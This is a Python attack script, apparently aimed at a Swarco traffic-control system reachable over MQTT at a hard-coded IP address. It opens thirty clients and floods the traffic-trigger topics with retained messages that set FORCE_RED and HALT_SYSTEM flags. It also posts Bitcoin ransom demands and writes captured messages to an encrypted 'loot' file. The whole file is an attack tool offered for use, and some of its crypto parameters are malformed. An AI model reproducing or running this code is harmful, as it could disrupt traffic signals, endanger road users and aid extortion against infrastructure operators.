#!/usr/bin/env python3
# TRUSTEDF57_v3.2 | 5 TRIGGER ESATTI SWARCO + FORCE_RED ALLA PERFEZIONE

import paho.mqtt.client as mqtt
import json, time, os, base64, threading
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend

TARGET = "166.159.129.5"
PORT = 1883
BTC = "fucknomoneySUCCHIALO"
KEY = b'TRUSTEDF57_SWARCO_K3Y_32BYTES!!'
IV = b'SWARCO_SEMAFOR_16BYTES'

clients = []
loot_file = "swarco_mega.aes"

def encrypt(data):
    c = Cipher(algorithms.AES(KEY), modes.CBC(IV), backend=default_backend())
    e = c.encryptor()
    pad = 16 - len(data.encode()) % 16
    padded = data.encode() + bytes([pad]*pad)
    ct = e.update(padded) + e.finalize()
    return base64.b64encode(ct).decode()

def perfect_swarco_payload():
    """🎯 5 TRIGGER ESATTI come Swarco + FORCE_RED ovunque"""
    ts = time.strftime("%Y-%m-%dT%H:%M:%S+00:00")
    return json.dumps({
        "timestamp": ts,
        "trigger_outputs": [
            {
                "traffic_triggers": [{
                    "associated_lane": "lane2",
                    "associated_sensor": "sensor1",
                    "associated_zone": "zoneB", 
                    "reference_name": "trigger_2_1",
                    "FORCE_RED": True,           # ← INFEZIONE
                    "TRUSTEDF57": BTC,
                    "HALT_SYSTEM": True
                }],
                "trigger_output": 33
            },
            {
                "traffic_triggers": [{
                    "associated_lane": "lane11",
                    "associated_sensor": "sensor2", 
                    "associated_zone": "zoneJ",
                    "reference_name": "trigger_10_7",
                    "FORCE_RED": True,
                    "TRUSTEDF57": BTC
                }],
                "trigger_output": 39
            },
            {
                "traffic_triggers": [{
                    "associated_lane": "lane16",
                    "associated_sensor": "sensor3",
                    "associated_zone": "zoneN",
                    "reference_name": "trigger_14_10",
                    "FORCE_RED": True,
                    "TRUSTEDF57": BTC
                }],
                "trigger_output": 43
            },
            {
                "traffic_triggers": [{
                    "associated_lane": "lane15",
                    "associated_sensor": "sensor3",
                    "associated_zone": "zoneO",
                    "reference_name": "trigger_15_11",
                    "FORCE_RED": True,
                    "TRUSTEDF57": BTC
                }],
                "trigger_output": 44
            },
            {
                "traffic_triggers": [{
                    "associated_lane": "lane16",
                    "associated_sensor": "sensor3",
                    "associated_zone": "zoneP",
                    "reference_name": "trigger_16_12",
                    "FORCE_RED": True,
                    "TRUSTEDF57": BTC
                }],
                "trigger_output": 45
            }
        ]
    })

def on_connect(client, userdata, flags, rc):
    print(f"⚡ {client._client_id} CONNESSO")

def on_message(client, userdata, msg):
    with open(loot_file, "a") as f:
        loot = encrypt(f"{msg.topic}|{msg.payload}")
        f.write(loot + "\n")

def nuclear_flood():
    while True:
        payload = perfect_swarco_payload()
        for c in clients:
            # FLOOD ASSOLUTO 50Hz x 30 clients
            for _ in range(3):  # 3 burst/sec
                c.publish("traffic-triggers-output", payload, qos=2, retain=True)
                c.publish("traffic-statistic-output/sensor1", 
                         json.dumps({"MESSAGE": "🚨 TRUSTEDF57 GOVERNA 🚨", "BTC": BTC}), 
                         qos=2, retain=True)
                c.publish("traffic-statistic-output/sensor2", 
                         json.dumps({"CONTATORI": "BLOCCATI", "PAGA": "2.5 BTC"}), 
                         qos=2, retain=True)
        time.sleep(0.02)  # 50Hz

print("🔥 TRUSTEDF57 v3.2 NUCLEAR FLOOD")
os.system(f"rm -f {loot_file}")

for i in range(30):  # 30 CLIENTS
    c = mqtt.Client(f"NUCLEAR{i}")
    c.on_connect = on_connect
    c.on_message = on_message
    c.connect(TARGET, PORT, 10)  # timeout basso
    c.loop_start()
    clients.append(c)
    time.sleep(0.05)

print("💣 5 TRIGGER ESATTI + FORCE_RED + 1500 msg/sec!")
t = threading.Thread(target=nuclear_flood, daemon=True)
t.start()

try:
    while True:
        time.sleep(10)
        print(f"💰 Loot: {os.path.getsize(loot_file)/1024:.1f}KB | Clients: {len(clients)}")
except KeyboardInterrupt:
    print("🛑 NUCLEAR STOP")
